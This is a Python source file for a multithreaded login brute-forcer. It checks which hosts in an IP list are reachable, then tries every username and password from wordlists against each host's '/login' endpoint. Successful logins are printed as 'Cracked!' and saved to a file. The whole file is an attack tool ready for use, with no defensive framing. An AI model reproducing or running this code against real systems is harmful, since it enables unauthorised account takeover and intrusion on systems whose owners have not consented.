import time
from functions import *
import json
import typer
from rich.progress import Progress
import concurrent.futures
import threading


class Crack:
    def __init__(self):
        self.lock = threading.Lock()

    def crack(
        self,
        path_ip_list: str,
        path_userlist: str,
        path_passwordlist: str,
        path_cracked: str,
        thread: int,
    ):
        ip_list = read_file(path_ip_list)
        usernamelist = read_file(path_userlist)
        passwordlist = read_file(path_passwordlist)
        cracked = []
        ip_up = []
        typer.secho(f"Start Check ip...", fg=typer.colors.CYAN)
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
            futures = [executor.submit(is_ip_up, ip) for ip in ip_list]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result[0]:
                    typer.secho(f"IP is UP: {result[1]}", fg=typer.colors.GREEN)
                    ip_up.append(result[1])

                else:
                    typer.secho(
                        f"IP not reachable: {result[1]}", fg=typer.colors.YELLOW
                    )

        typer.secho(f"\nStart Crack...", fg=typer.colors.CYAN)

        def process_ip(ip):
            for username in usernamelist:
                progress.update(username_task, description=f"[red]username: {username}")
                for password in passwordlist:
                    progress.update(password_task, description=f"[blue]password: {password}")
                    should_break = False
                    try:
                        data = {"username": username, "password": password}
                        response = make_request_with_retries(
                            url=f"{ip}/login", data=data
                        )

                        if response.status_code == 404:
                            typer.secho(
                                f"\n404 Not Found: {ip}", fg=typer.colors.YELLOW
                            )
                            should_break = True
                            break

                        try:
                            json_data = response.json()
                        except json.JSONDecodeError:
                            typer.secho(
                                f"\nInvalid JSON response from {ip}",
                                fg=typer.colors.YELLOW,
                            )
                            should_break = True
                            break

                        if json_data.get("success"):
                            with self.lock:
                                typer.secho(f"\nCracked!\nip => {ip}\nusername =>{username}\npassword => {password}\n", fg=typer.colors.GREEN)
                                cracked.append(
                                    f"\nip => {ip}\nusername =>{username}\npassword => {password}\n\n"
                                )
                            return (
                                ip  # Exit the function once a successful login is found
                            )
                    except Exception as e:
                        typer.secho(
                            f"\nRequest error for {ip}: {e}", fg=typer.colors.RED
                        )
                        should_break = True
                        break
                    progress.update(password_task, advance=1)
                    time.sleep(0.5)
                progress.update(username_task, advance=1)
                if should_break:
                    break
            return ip

        with Progress() as progress:
            ip_task = progress.add_task("[green]Processing IPs", total=len(ip_list))
            username_task = progress.add_task(
                "[blue]Processing Usernames", total=len(usernamelist)
            )
            password_task = progress.add_task(
                "[Yellow]Processing Passwords", total=len(passwordlist)
            )

            with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
                for ip in ip_up:
                    progress.update(ip_task, description=f"[green]{ip}")
                    futures = [executor.submit(process_ip, ip)]
                for future in concurrent.futures.as_completed(futures):
                    try:
                        progress.update(ip_task, advance=1)
                    except Exception as e:
                        typer.secho(f"Exception occurred: {e}", fg=typer.colors.RED)

        save_cracked(cracked, path_cracked)
        typer.secho("\nEnd", fg=typer.colors.GREEN)
